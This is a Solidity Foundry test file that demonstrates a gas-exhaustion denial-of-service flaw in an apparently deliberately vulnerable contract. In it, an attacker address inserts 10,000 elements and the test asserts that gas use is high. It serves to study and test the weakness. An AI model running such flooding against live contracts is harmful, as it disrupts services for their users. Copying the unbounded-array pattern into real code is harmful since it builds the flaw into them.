// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/dos_number.sol";

contract DosNumberTest is Test {
    DosNumber dosNumber;
    address attacker = address(0x1337);

    function setUp() public {
        dosNumber = new DosNumber();
        vm.deal(attacker, 1 ether);
    }

    function testDenialOfServicePotential() public {
        vm.startPrank(attacker);

        // Initial small insert to verify normal operation
        dosNumber.insertNnumbers(1, 10);
        (uint inserts, uint arrayLength) = dosNumber.getUserStats(attacker);
        assertEq(inserts, 10);
        assertEq(arrayLength, 10);

        // Test with a large but manageable number to demonstrate DOS potential
        uint largeNumber = 10_000;

        // Measure gas usage to demonstrate DOS potential
        uint gasBefore = gasleft();
        dosNumber.insertNnumbers(2, largeNumber);
        uint gasUsed = gasBefore - gasleft();

        vm.stopPrank();

        // Verify the attack was successful by checking gas usage
        assertTrue(gasUsed > 500_000, "High gas consumption indicates DOS potential");
        (inserts, arrayLength) = dosNumber.getUserStats(attacker);
        assertEq(inserts, 10 + largeNumber, "Insert count should reflect attack");
    }

    function testArrayGrowthMechanism() public {
        vm.startPrank(attacker);

        // Test array growth mechanism with multiple smaller inserts
        uint initialLength = dosNumber.getRealLengthArray();

        // Perform multiple inserts to trigger array growth
        for (uint i = 0; i < 10; i++) {
            dosNumber.insertNnumbers(i, 100);
        }

        vm.stopPrank();

        // Verify array growth and stats
        uint finalLength = dosNumber.getRealLengthArray();
        assertTrue(finalLength > initialLength, "Array should have grown");
        (uint totalInserts, ) = dosNumber.getUserStats(attacker);
        assertEq(totalInserts, 1000, "Should have inserted 1000 elements");
    }
}
